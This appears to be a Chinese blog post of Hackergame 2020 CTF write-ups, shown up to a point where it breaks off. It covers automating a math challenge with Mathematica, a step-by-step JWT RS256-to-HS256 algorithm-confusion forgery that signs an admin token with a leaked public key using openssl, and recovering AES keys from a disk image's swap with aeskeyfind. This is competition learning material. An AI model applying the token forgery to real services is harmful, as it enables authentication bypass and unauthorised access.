<p>然而！其他都能用，一把上述调好的解析 LaTeX 的代码用这个 client 执行，终端就卡死了，啥反应没有，人傻了。试了好久不知道是我写的问题还是他本身的问题了。。</p>
<p>最后实在不行，改用命令行执行，可以调用安装目录下的 <code>wolframscript -code &lt;CodeHere&gt;</code> 来执行代码。就类似于 Python 的 <code>python3 -c &lt;CodeHere&gt;</code> 用法。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108023824075.png" alt="directory"></p>
<p>然而发现也不行，可能由于引号和<code>[ ]</code>的问题语法不对执行失败了。</p>
<p>最后没办法了，干脆直接跑个终端吧。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Hongkun_419/article/details/103767479">windows下python3如何调用mathematica进行高级计算</a> 这一篇，用 winpexpect 来进行交互式操作。</p>
<p>（发现有大师傅直接用 pwntools 进行交互，其实也行 2333.</p>
<p>具体现在一会儿还说不清楚，后面专门写一篇讲这个交互的吧，<del>代码还没优化好，终端超时还没处理好以至于会开一堆终端……</del></p>
<p>反正就调用 MMA 去计算，然后输出结果读进来，调用 <code>/submit</code> 接口提交答案。</p>
<p>好不容易到这一步都差不多了，心态已经炸的不行了（已经调了一下午了）。结果发现怎么一直卡在 399 题下不去？？？</p>
<p>开始怀疑我 POST 请求参数是不是不对，题目需要的是 <code>x-www-form-urlencoded</code>，难不成整了 <code>form-data</code> 或者其他的？</p>
<p>用 <a target="_blank" rel="noopener" href="http://httpbin.org/">httpbin</a> 试了试，又在 VPS 上搭了个接口接收试了试，没毛病啊……</p>
<p>再看代码，难不成 cookie 炸了。写了挺多爬虫了，一般都用 <code>requests.Session()</code> 维持 Cookie 状态，之前也没碰到炸的，不会这里坏掉吧。</p>
<p>再去研究了亿次提交过程，发现 POST 会带上此时的 Cookie，返回一个302跳转，同时 Set-Cookie，跳转之后 GET 方法带上新的 Cookie 去访问根目录，得到返回的同时又设置了新的 Cookie。</p>
<p>手动用 Postman 模拟了一下，如果（跟随 302 跳转）不及时更新 Cookie 的话，确实会一直卡在之前的状态，甚至连 <code>答案正确</code>、<code>答案错误</code>之类的话都一模一样，还需解答的题目数量也不变，太草了！</p>
<p><strong>于是比赛的时候就卡这里了。又调了一晚上心态彻底炸了。。</strong>  <em><del>（后来就没打了</del></em></p>
<p><del>现在想想应该是我把初始的 <code>Cookie</code> 写到了 <code>Headers</code> 里的原因吧，后面单独设置 cookie，慢慢优化代码再试试。</del></p>
<blockquote>
<p><strong>20201109 Update:</strong></p>
<p>优化了亿下，现在差不多了，能流畅求解了，后面专门写一篇讲讲 Python 和 MMA 交互的。 <em>（留坑）</em></p>
<p>先简单说一说吧。</p>
<p><strong>参考 Mathematica 计算式：</strong></p>
<pre class="language-mathematica" data-language="mathematica"><code class="language-mathematica">NIntegrate[ToExpression["\\sqrt{x} + \\frac{5}{x} + \\ln\\left(x\\right) + \\sin\\left(\\ln\\left(x\\right)\\right)",TeXForm],{x,ToExpression["\\frac{2}{3}",TeXForm],ToExpression["\\frac{4}{3}",TeXForm]},WorkingPrecision-&gt;12]</code></pre>

<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201109012506678.png" alt="MMA示例"></p>
<p>之前试了直接用 <code>ToExpression</code> 把包含 <code>\\int_{}^{}</code> 的积分表达式全部写进去，但发现计算速度特别慢，甚至会卡死，而且结果也不对。</p>
<p>还是单独把被积表达式、上下限提取出来，用自带的 <code>NIntegrate</code> 积分求解，顺便指定精度来的实在。</p>
<p>另外，这个题目卡在 399 题下不去的原因应该是初始时候的 Cookie 设置不对，在302跳转的设置上，经测试，<code>allow_redirects</code> 无论是 True 或者 False，Cookie 都能正确更新，也就是说用 <code>requests.Session()</code> 来维持 Cookie 状态是没问题的。</p>
<p>在<strong>最开始的时候加上一个登录，把自己的 token 带上</strong>就能解决问题了，与<code>allow_redirects</code> 设置无关。这题甚至连 headers 都不需要设置。</p>
<p>参考代码如下。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus
<span class="token keyword">import</span> requests

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>
resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
 <span class="token string-interpolation"><span class="token string">f"http://202.38.93.111:10190/login?token=</span><span class="token interpolation"><span class="token punctuation">{</span>quote_plus<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>
<span class="token comment"># ...</span></code></pre>
</blockquote>
<blockquote>
<p>看了官方 WP 发现 Python 里的 sympy 库居然自带有解析 LaTeX 的，害，还是太菜了。</p>
</blockquote>
<hr>
<h2 id="普通的身份认证器"><a href="#普通的身份认证器" class="headerlink" title="普通的身份认证器"></a>普通的身份认证器</h2><blockquote>
<p>近日，小 T 接手了某个老旧 Python 网站的重构工作。接手之后，他把原先的 requirements.txt  复制到了新项目下，更换了后端框架，照着框架文档魔改了身份认证部分的内容，写出了一个测试用的原型。看起来一切都很正常，只是他似乎没有仔细检查每一项依赖的版本。</p>
<p>「懒得管了，又不是不能用！」但果真如此吗？</p>
</blockquote>
<p>登录后会返回一个 <code>access_token</code>，base64 解码一下很明显是 JWT。当然 JavaScript 代码里逻辑也很明显了。</p>
<pre class="language-none"><code class="language-none">{"typ":"JWT","alg":"RS256"}.{"sub":"guest","exp":1604399671}.........</code></pre>
<blockquote>
<p>一个 JWT 实际上就是一个字符串，它由三部分组成：<strong>头部 Header、载荷 Payload 与签名 Signature</strong>。将这三段信息文本用.链接一起就构成了 JWT 字符串。</p>
<p>参考官网 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>以及 阮一峰的 <a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></p>
</blockquote>
<p>再点击 <code>获取用户信息</code> 时把这个 jwt 放到 请求头的 <code>Authorization</code> 参数里，同时也带上 <code>Hg-Token</code> 即你自己 hackergame 的 token。</p>
<p>根据题目提示，身份认证的版本上有漏洞，查了一下。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/">JWT Attack Walk-Through</a> 一文。</p>
<blockquote>
<p>There’s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using <em>asymmetric</em> cryptography into accepting a <em>symmetrically</em> signed token. This article assumes you’re comfortable with JWTs and the theory of this attack, but the nub of it is that by <strong>switching the token algorithm from ‘RS’ to ‘HS’, a vulnerable endpoint will use its public  key to verify the token in a symmetric way</strong> (and being public, that key isn’t much of a secret).</p>
</blockquote>
<p>简单的说就是把 RS -&gt; HS，而后后端就用公钥去验证 token。</p>
<p>另外根据 HTML 里的提示，系统用了 FastAPI, Axios and Vue.js。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103182611421.png" alt="html"></p>
<p>其中 <a target="_blank" rel="noopener" href="https://fastapi.tiangolo.com/zh/#api">FastAPI 自身带有 API 文档</a>。</p>
<p>在这题中就是 <a target="_blank" rel="noopener" href="http://202.38.93.111:10092/docs">http://202.38.93.111:10092/docs</a> 以及 <a target="_blank" rel="noopener" href="http://202.38.93.111:10092/redoc">http://202.38.93.111:10092/redoc</a></p>
<p>发现有一个 <code>POST /debug</code> 的接口，请求一下试试。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103184932948.png" alt="debug API"></p>
<p>正好合适，这应该就是我们需要的公钥了。</p>
<pre class="language-none"><code class="language-none">-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF
eNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf
ft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr
+xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY
M688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd
46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s
eDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL
3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns
QcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb
pBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv
FCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==
-----END RSA PUBLIC KEY-----
</code></pre>
<p>把公钥保存带 <code>key.pem</code> 文件中。</p>
<p>这里要注意一下，<strong>换行用的是 <code>\n</code>**，即十六进制的 <code>0A</code>，而不是 <code>\r\n</code> (<code>0D0A</code>)。且</strong>最末尾有 <code>\n</code>**。</p>
<p>转十六进制。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> key.pem <span class="token operator">|</span> xxd -p <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">"<span class="token entity" title="\\">\\</span>n"</span>
2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a</code></pre>
<p>Payload 里</p>
<p>加密算法由 <code>RS256</code> 降级为 <code>HS256</code>，再根据题目要求，需要把 <code>guest</code> 改成 <code>admin</code>.</p>
<pre class="language-none"><code class="language-none">{"typ":"JWT","alg":"HS256"}.{"sub":"admin","exp":1604399671}</code></pre>
<p>base64 编码一下，且去掉结尾的 <code>=</code>，注意不要丢掉中间的 <code>.</code>。</p>
<pre class="language-none"><code class="language-none">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0</code></pre>
<p>下面开始算加密所用的<strong>签名（Signature）</strong>。</p>
<p>把上面得到的证书加载进来，用他来加密。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n <span class="token string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0"</span> <span class="token operator">|</span> openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a
<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token operator">=</span> 6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc</code></pre>
<p>最后一行即得到的 HMAC signature 结果，再将这个 ASCII hex signature 转换为 JWT format。</p>
<blockquote>
<p><code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。（Base64URL 算法）</p>
</blockquote>
<p>Python 的一行代码实现。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">"exec(<span class="token entity" title="\&quot;">\"</span>import base64, binascii<span class="token entity" title="\n">\n</span>print base64.urlsafe_b64encode(binascii.a2b_hex('6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc')).replace('=','')<span class="token entity" title="\&quot;">\"</span>)"</span>
ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre>
<p>最后拼接得到 JWT。</p>
<pre class="language-none"><code class="language-none">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0.ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw</code></pre>
<p>把这个放到 Authorization 里。别忘了 Hg-Token。</p>
<p>最后得到 flag。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103181836118.png" alt="flag"></p>
<p><code>flag{just_A_simple_Json_Web_T0ken_exp1oit_xxxxx}</code></p>
<hr>
<h2 id="室友的加密硬盘"><a href="#室友的加密硬盘" class="headerlink" title="室友的加密硬盘"></a>室友的加密硬盘</h2><p><em>（复现）</em></p>
<blockquote>
<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>
</blockquote>
<p>解压出来一个 img 文件，首先拿 WinHex 看一下。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184631641.png" alt="winhex"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184704003.png" alt="分区1"></p>
<p>分区1里有个 keyfile，内容为</p>
<pre class="language-none"><code class="language-none">I'm not that stupid to put plaintext key in /boot!</code></pre>
<p>啊这。</p>
<p>分区2不知道是啥。</p>
<p>分区3应该就是需要破解的加密部分了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107184928622.png" alt="分区3"></p>
<p>分区4感觉像是根目录，不全。</p>
<p>然后在 Linux 里扔给 fdisk 看一下。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">fdisk</span> roommates_disk_part.img 

Welcome to <span class="token function">fdisk</span> <span class="token punctuation">(</span>util-linux <span class="token number">2.31</span>.1<span class="token punctuation">)</span>.
Changes will remain <span class="token keyword">in</span> memory only, <span class="token keyword">until</span> you decide to <span class="token function">write</span> them.
Be careful before using the <span class="token function">write</span> command.


Command <span class="token punctuation">(</span>m <span class="token keyword">for</span> <span class="token builtin class-name">help</span><span class="token punctuation">)</span>: p
Disk roommates_disk_part.img: <span class="token number">2</span> GiB, <span class="token number">2147483648</span> bytes, <span class="token number">4194304</span> sectors
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes
Sector size <span class="token punctuation">(</span>logical/physical<span class="token punctuation">)</span>: <span class="token number">512</span> bytes / <span class="token number">512</span> bytes
I/O size <span class="token punctuation">(</span>minimum/optimal<span class="token punctuation">)</span>: <span class="token number">512</span> bytes / <span class="token number">512</span> bytes
Disklabel type: dos
Disk identifier: 0xa4ee910b

Device                   Boot   Start      End  Sectors  Size Id Type
roommates_disk_part.img1 *       <span class="token number">2048</span>   <span class="token number">391167</span>   <span class="token number">389120</span>  190M <span class="token number">83</span> Linux
roommates_disk_part.img2       <span class="token number">393214</span> <span class="token number">16775167</span> <span class="token number">16381954</span>  <span class="token number">7</span>.8G  <span class="token number">5</span> Extended
roommates_disk_part.img5       <span class="token number">393216</span>  <span class="token number">1890303</span>  <span class="token number">1497088</span>  731M <span class="token number">82</span> Linux swap / Solaris
roommates_disk_part.img6      <span class="token number">1892352</span>  <span class="token number">3891199</span>  <span class="token number">1998848</span>  976M <span class="token number">83</span> Linux
roommates_disk_part.img7      <span class="token number">3893248</span> <span class="token number">16775167</span> <span class="token number">12881920</span>  <span class="token number">6</span>.1G <span class="token number">83</span> Linux</code></pre>
<p>可以看到有 swap 交换分区，以及不全的 Linux 分区？而且直接挂载也挂不上。</p>
<p>搜了一下 <strong>LUKS 加密</strong>相关的文章，找到了国外师傅的 WriteUp，参考：</p>
<p><a target="_blank" rel="noopener" href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/">[Forensics] BsidesSF 2019 - goodluks2</a></p>
<p><a target="_blank" rel="noopener" href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/">[Forensics] BsidesSF 2019 - goodluks3</a></p>
<p>首先用 <strong>aeskeyfind</strong> 这个工具找一找 swap 分区里有没有残留的 AES Key。发现果然有，但是一堆。。</p>
<p>（本来应该先把这几个分区用 <code>dd</code> 之类工具分割一下的，但我懒了嘤嘤嘤</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ aeskeyfind roommates_disk_part.img 
e195501f5bf8fffe5f4c66c43249a5747875c98f9cb598c70f52a0d05f0601bc
d913145b01b203ca068e48d2f40b048639d8c6f4cfe93b22c3795945ca9d9e2a
000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
457895c6ffa897807497bc31320cf9bff6707e176be26a1058fa49a12ccd2762
b895ea5154cea307a3f3891fd43f19c0d54ba38b8dd28519841fa818f24eaefb
082c4400a34b81dbc80de81874cf03ff16d97eb9380c515d3ec48e8433d7dc64
ef3b6d7b80e9ff8b13c8b801984d2c9cf6c0ca8dd342da98112f0c70f34fd5c8
4cdc0c14cb55bb435e75438b7d73f445ed5e90c9514b2d4264c753492bf847e8
9f3330a42a7f6446260df6e2f31d311e2fcfa3d6e1f4736e835b78e63c97ccc3
eab90394d3e9892c87a4b2f32144c71a2b1d2e0cdefce683125d695d6ed81d6c
37d7deb43c0223b8656dd6a862562a1a8360926278dc65f445eda2146844589f
000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
6bc77bd328b378315a193c7dfa0d14c2f023f5565564de40a6ba66d29aedfd3d
31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c
e4d58f63d629f38803da3c712c5a0cc2be774b9d925d136024a181315d91ac99
136ce9ce0d3f130ebe629570a08bc2ea883e451533875140027d1b3fdb5d0091
31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c
fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6
e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1
4c82f3493f9a3381f51c394ab8532bd037db64b793057aade3d6bf67cbebf933
fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6
e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1
Keyfind progress: <span class="token number">100</span>%</code></pre>
<p>或者用 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/findaes/">findaes 这个工具</a>。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ./findaes roommates_disk_part.img
Searching roommates_disk_part.img
Found AES-256 key schedule at offset 0xc3ffde4:
e1 <span class="token number">95</span> <span class="token number">50</span> 1f 5b f8 ff fe 5f 4c <span class="token number">66</span> c4 <span class="token number">32</span> <span class="token number">49</span> a5 <span class="token number">74</span> <span class="token number">78</span> <span class="token number">75</span> c9 8f 9c b5 <span class="token number">98</span> c7 0f <span class="token number">52</span> a0 d0 5f 06 01 <span class="token function">bc</span>
Found AES-256 key schedule at offset 0xc6529d8:
d9 <span class="token number">13</span> <span class="token number">14</span> 5b 01 b2 03 ca 06 8e <span class="token number">48</span> d2 f4 0b 04 <span class="token number">86</span> <span class="token number">39</span> d8 c6 f4 cf e9 3b <span class="token number">22</span> c3 <span class="token number">79</span> <span class="token number">59</span> <span class="token number">45</span> ca 9d 9e 2a
Found AES-256 key schedule at offset 0xc652b08:
00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> 1a 1b 1c 1d 1e 1f
Found AES-256 key schedule at offset 0xc652bfc:
<span class="token number">45</span> <span class="token number">78</span> <span class="token number">95</span> c6 ff a8 <span class="token number">97</span> <span class="token number">80</span> <span class="token number">74</span> <span class="token number">97</span> <span class="token function">bc</span> <span class="token number">31</span> <span class="token number">32</span> 0c f9 bf f6 <span class="token number">70</span> 7e <span class="token number">17</span> 6b e2 6a <span class="token number">10</span> <span class="token number">58</span> fa <span class="token number">49</span> a1 2c <span class="token builtin class-name">cd</span> <span class="token number">27</span> <span class="token number">62</span>
Found AES-256 key schedule at offset 0xc73bde4:
b8 <span class="token number">95</span> ea <span class="token number">51</span> <span class="token number">54</span> ce a3 07 a3 f3 <span class="token number">89</span> 1f d4 3f <span class="token number">19</span> c0 d5 4b a3 8b 8d d2 <span class="token number">85</span> <span class="token number">19</span> <span class="token number">84</span> 1f a8 <span class="token number">18</span> f2 4e ae fb
Found AES-256 key schedule at offset 0xc7aade4:
08 2c <span class="token number">44</span> 00 a3 4b <span class="token number">81</span> db c8 0d e8 <span class="token number">18</span> <span class="token number">74</span> cf 03 ff <span class="token number">16</span> d9 7e b9 <span class="token number">38</span> 0c <span class="token number">51</span> 5d 3e c4 8e <span class="token number">84</span> <span class="token number">33</span> d7 <span class="token function">dc</span> <span class="token number">64</span>
Found AES-256 key schedule at offset 0xcbffde4:
ef 3b 6d 7b <span class="token number">80</span> e9 ff 8b <span class="token number">13</span> c8 b8 01 <span class="token number">98</span> 4d 2c 9c f6 c0 ca 8d d3 <span class="token number">42</span> da <span class="token number">98</span> <span class="token number">11</span> 2f 0c <span class="token number">70</span> f3 4f d5 c8
Found AES-256 key schedule at offset 0xfd13de4:
4c <span class="token function">dc</span> 0c <span class="token number">14</span> cb <span class="token number">55</span> bb <span class="token number">43</span> 5e <span class="token number">75</span> <span class="token number">43</span> 8b 7d <span class="token number">73</span> f4 <span class="token number">45</span> ed 5e <span class="token number">90</span> c9 <span class="token number">51</span> 4b 2d <span class="token number">42</span> <span class="token number">64</span> c7 <span class="token number">53</span> <span class="token number">49</span> 2b f8 <span class="token number">47</span> e8
Found AES-256 key schedule at offset 0x101efde4:
9f <span class="token number">33</span> <span class="token number">30</span> a4 2a 7f <span class="token number">64</span> <span class="token number">46</span> <span class="token number">26</span> 0d f6 e2 f3 1d <span class="token number">31</span> 1e 2f cf a3 d6 e1 f4 <span class="token number">73</span> 6e <span class="token number">83</span> 5b <span class="token number">78</span> e6 3c <span class="token number">97</span> cc c3
Found AES-256 key schedule at offset 0x110d5de4:
ea b9 03 <span class="token number">94</span> d3 e9 <span class="token number">89</span> 2c <span class="token number">87</span> a4 b2 f3 <span class="token number">21</span> <span class="token number">44</span> c7 1a 2b 1d 2e 0c de fc e6 <span class="token number">83</span> <span class="token number">12</span> 5d <span class="token number">69</span> 5d 6e d8 1d 6c
Found AES-256 key schedule at offset 0x1337c9d8:
<span class="token number">37</span> d7 de b4 3c 02 <span class="token number">23</span> b8 <span class="token number">65</span> 6d d6 a8 <span class="token number">62</span> <span class="token number">56</span> 2a 1a <span class="token number">83</span> <span class="token number">60</span> <span class="token number">92</span> <span class="token number">62</span> <span class="token number">78</span> <span class="token function">dc</span> <span class="token number">65</span> f4 <span class="token number">45</span> ed a2 <span class="token number">14</span> <span class="token number">68</span> <span class="token number">44</span> <span class="token number">58</span> 9f
Found AES-256 key schedule at offset 0x1337cb08:
00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> 1a 1b 1c 1d 1e 1f
Found AES-256 key schedule at offset 0x1337cbfc:
6b c7 7b d3 <span class="token number">28</span> b3 <span class="token number">78</span> <span class="token number">31</span> 5a <span class="token number">19</span> 3c 7d fa 0d <span class="token number">14</span> c2 f0 <span class="token number">23</span> f5 <span class="token number">56</span> <span class="token number">55</span> <span class="token number">64</span> de <span class="token number">40</span> a6 ba <span class="token number">66</span> d2 9a ed fd 3d
Found AES-256 key schedule at offset 0x14e67de4:
<span class="token number">31</span> c6 9d ff <span class="token number">83</span> <span class="token number">84</span> 7a 6c 3c 3c 09 1e 4f f6 <span class="token number">11</span> 3c a5 <span class="token number">79</span> 9e 1b <span class="token number">63</span> <span class="token number">65</span> 6f 0b d5 1b d6 <span class="token number">49</span> 0c <span class="token number">20</span> <span class="token number">76</span> 9c
Found AES-256 key schedule at offset 0x1618ca1a:
e4 d5 8f <span class="token number">63</span> d6 <span class="token number">29</span> f3 <span class="token number">88</span> 03 da 3c <span class="token number">71</span> 2c 5a 0c c2 be <span class="token number">77</span> 4b 9d <span class="token number">92</span> 5d <span class="token number">13</span> <span class="token number">60</span> <span class="token number">24</span> a1 <span class="token number">81</span> <span class="token number">31</span> 5d <span class="token number">91</span> ac <span class="token number">99</span>
Found AES-256 key schedule at offset 0x1618cc0e:
<span class="token number">13</span> 6c e9 ce 0d 3f <span class="token number">13</span> 0e be <span class="token number">62</span> <span class="token number">95</span> <span class="token number">70</span> a0 8b c2 ea <span class="token number">88</span> 3e <span class="token number">45</span> <span class="token number">15</span> <span class="token number">33</span> <span class="token number">87</span> <span class="token number">51</span> <span class="token number">40</span> 02 7d 1b 3f db 5d 00 <span class="token number">91</span>
Found AES-256 key schedule at offset 0x1632db50:
<span class="token number">31</span> c6 9d ff <span class="token number">83</span> <span class="token number">84</span> 7a 6c 3c 3c 09 1e 4f f6 <span class="token number">11</span> 3c a5 <span class="token number">79</span> 9e 1b <span class="token number">63</span> <span class="token number">65</span> 6f 0b d5 1b d6 <span class="token number">49</span> 0c <span class="token number">20</span> <span class="token number">76</span> 9c
Found AES-256 key schedule at offset 0x171c873a:
fa 01 a9 <span class="token number">80</span> <span class="token number">89</span> a3 8f <span class="token number">60</span> 6c <span class="token number">14</span> <span class="token number">86</span> <span class="token number">94</span> e7 a3 <span class="token number">50</span> 9a ac cf c1 <span class="token number">65</span> 06 8e d6 7f <span class="token number">57</span> <span class="token number">15</span> <span class="token number">38</span> 4b <span class="token number">93</span> e5 6a a6
Found AES-256 key schedule at offset 0x171c890d:
e4 <span class="token number">58</span> <span class="token number">16</span> <span class="token number">75</span> c3 f9 <span class="token number">47</span> f7 b5 <span class="token number">37</span> a3 <span class="token function">dd</span> <span class="token number">60</span> <span class="token number">98</span> e4 a5 <span class="token number">89</span> 8b 0a <span class="token number">18</span> c2 b3 b0 f6 <span class="token number">75</span> c6 1d e4 <span class="token number">10</span> 6f c6 a1
Found AES-256 key schedule at offset 0x17d08b20:
4c <span class="token number">82</span> f3 <span class="token number">49</span> 3f 9a <span class="token number">33</span> <span class="token number">81</span> f5 1c <span class="token number">39</span> 4a b8 <span class="token number">53</span> 2b d0 <span class="token number">37</span> db <span class="token number">64</span> b7 <span class="token number">93</span> 05 7a ad e3 d6 bf <span class="token number">67</span> cb eb f9 <span class="token number">33</span>
Found AES-256 key schedule at offset 0x19013349:
